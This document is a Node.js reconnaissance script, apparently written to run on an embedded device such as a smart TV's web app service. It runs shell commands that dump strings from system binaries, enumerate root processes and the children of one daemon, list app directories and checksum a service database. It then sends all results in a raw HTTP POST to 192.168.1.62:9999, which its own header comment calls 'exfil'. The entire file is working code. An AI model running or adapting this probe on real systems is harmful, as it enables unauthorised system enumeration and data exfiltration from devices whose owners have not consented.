"use strict";
/* p39: WAS binaries forensics
   - strings on was/wascmd/litewas/wasutility: error enums + usage
   - run wasutility (no args) -> usage
   - df -h + /opt/share/webappservice layout + new app dirs
   - find daemon binary (ppid 327 / root was*)
   - exfil /p39info
*/
var fs = null, cp = null, net = null;
try { fs = require('fs'); } catch (e) {}
try { cp = require('child_process'); } catch (e) {}
try { net = require('net'); } catch (e) {}

var HOST = '192.168.1.62';
var PORT = 9999;
var R = { ts: new Date().toISOString(), probe: 'p39', results: {}, log: [] };
var posted = false;

function L(s) { R.log.push(String(s).substring(0, 500)); }

function postBuf(path, buf) {
  var hdr = 'POST ' + path + ' HTTP/1.1\r\nHost: ' + HOST + ':9999\r\nContent-Type: application/octet-stream\r\nContent-Length: ' + buf.length + '\r\nConnection: close\r\n\r\n';
  try {
    var s = net.connect(PORT, HOST);
    s.setTimeout(60000, function () { s.destroy(); });
    s.on('connect', function () {
      s.write(hdr);
      var off = 0;
      var iv = setInterval(function () {
        if (off >= buf.length) { clearInterval(iv); setTimeout(function () { s.destroy(); }, 3000); return; }
        s.write(buf.slice(off, off + 65536));
        off += 65536;
      }, 50);
      setTimeout(function () { s.destroy(); }, 120000);
    });
    s.on('error', function (e) { L('postBuf err ' + e.message); });
  } catch (e) { L('postBuf ctor ' + e); }
}

function postFinal() {
  if (posted) return;
  posted = true;
  postBuf('/p39info', new Buffer(JSON.stringify(R), 'utf8'));
}

function run(cmd, timeoutMs) {
  timeoutMs = timeoutMs || 20000;
  return new Promise(function (resolve) {
    if (!cp) { resolve('[no child_process]'); return; }
    var out = '', err = '', done = false;
    var child;
    try { child = cp.spawn('sh', ['-c', cmd], { stdio: ['ignore', 'pipe', 'pipe'] }); }
    catch (e) { resolve('[spawn err ' + e + ']'); return; }
    var t = setTimeout(function () {
      if (done) return; done = true;
      try { child.kill('SIGKILL'); } catch (e) {}
      resolve('[timeout ' + timeoutMs + '] ' + (out || err).substring(0, 8000));
    }, timeoutMs);
    child.stdout.on('data', function (d) { out += d.toString(); });
    child.stderr.on('data', function (d) { err += d.toString(); });
    child.on('close', function (code) {
      if (done) return; done = true; clearTimeout(t);
      var s = (out || err);
      if (code !== 0) s = '[exit ' + code + '] ' + s;
      resolve(s.substring(0, 9000));
    });
    child.on('error', function (e) {
      if (done) return; done = true; clearTimeout(t);
      resolve('[err ' + e.message + ']');
    });
  });
}

function seq(steps) {
  var i = 0;
  function next() {
    if (i >= steps.length) { postFinal(); return; }
    var s = steps[i++];
    s.fn().then(function (r) {
      R.results[s.name] = r;
      next();
    }).catch(function (e) {
      R.results[s.name] = '[exception ' + e + ']';
      next();
    });
  }
  next();
}

var steps = [
  { name: 'wascmd_strings', fn: function () {
      return run('strings /usr/bin/wascmd 2>/dev/null | grep -E "install failed|install start|install completed|install start|WAS_ERR|1180[0-9][0-9]|cmd_ret|spend time" | sort -u | head -60', 30000);
  }},
  { name: 'was_strings', fn: function () {
      return run('strings /usr/bin/was 2>/dev/null | grep -E "install|WAS_ERR|1180[0-9][0-9]|signature|author|package" | sort -u | head -80', 30000);
  }},
  { name: 'litewas_strings', fn: function () {
      return run('strings /usr/bin/litewas 2>/dev/null | head -120', 30000);
  }},
  { name: 'wasutility_usage', fn: function () {
      return run('/usr/bin/wasutility 2>&1 | head -60; echo ===; /usr/bin/wasutility h 2>&1 | head -40; echo ===; /usr/bin/wasutility help 2>&1 | head -40', 20000);
  }},
  { name: 'wasutility_strings', fn: function () {
      return run('strings /usr/bin/wasutility 2>/dev/null | grep -iE "usage|help|version|cntps|restore|re:|app|install|uninstall|db|error|1180[0-9][0-9]" | sort -u | head -120', 30000);
  }},
  { name: 'df_space', fn: function () {
      return run('df -h 2>&1 | head -20; echo ===; df -i /opt/share 2>/dev/null | head -5', 15000);
  }},
  { name: 'webappservice_share', fn: function () {
      return run('ls -la /opt/share/webappservice/ 2>&1 | head -30; echo ===; ls -la /opt/share/webappservice/apps_icon/Panel/ 2>/dev/null | grep -iE "Fresh|Place|FreeMyTV|xvvl" | head -10', 15000);
  }},
  { name: 'apps_rw_new', fn: function () {
      return run('ls -la /opt/usr/home/owner/apps_rw/ 2>/dev/null | grep -iE "Fresh|Place|FreeMyTV|xvvl|total|^d" | head -20', 15000);
  }},
  { name: 'daemon_hunt', fn: function () {
      return run('ls -la /proc/327/exe /proc/327/cmdline 2>&1 | head -5; echo ===; for p in $(ls -d /proc/[0-9]* 2>/dev/null | head -200); do pid=$(basename $p); pp=$(awk \'/^PPid:/{print $2}\' $p/status 2>/dev/null); if [ "$pp" = "327" ]; then echo "child of 327: $pid $(cat $p/comm 2>/dev/null)"; fi; done 2>/dev/null | head -30', 30000);
  }},
  { name: 'root_procs', fn: function () {
      return run('ps -eo pid,ppid,user,comm 2>/dev/null | grep -E "^[ 0-9]+ [0-9]+ root " | grep -vE "kworker|ksoftirq|migration|kthread|rcu_|kblockd|kdevtmpfs|netns|oom|watchdog|sdp_|VosM|VosT|wlan_|loop[0-9]|periodicWorker|instant|jbd2|fsck|scsi|usb|ehci|xhci|usbcore|khub|uvc|backlight|kvm|events|crypto|nfit|kswapd|ssm" | head -120', 20000);
  }},
  { name: 'error_enum_hunt', fn: function () {
      return run('for f in /usr/bin/was /usr/bin/litewas /usr/lib/libwas_api.so* /usr/lib/libwas_manager_api.so* /usr/lib/libwas_util_api.so*; do [ -f "$f" ] && echo "== $f" && strings "$f" 2>/dev/null | grep -E "^11[0-9]{4}$|118019|118012|118022" | head -15; done', 40000);
  }},
  { name: 'wasdb_backup_diff', fn: function () {
      return run('ls -la /opt/usr/apps/webappservice/wasdb_backup/ 2>&1; echo ===; md5sum /opt/dbspace/.webappservice.db /opt/usr/apps/webappservice/wasdb_backup/.webappservice.db 2>&1', 15000);
  }}
];

seq(steps);

setTimeout(function () { R.results.guard = 'global timeout'; postFinal(); }, 150000);
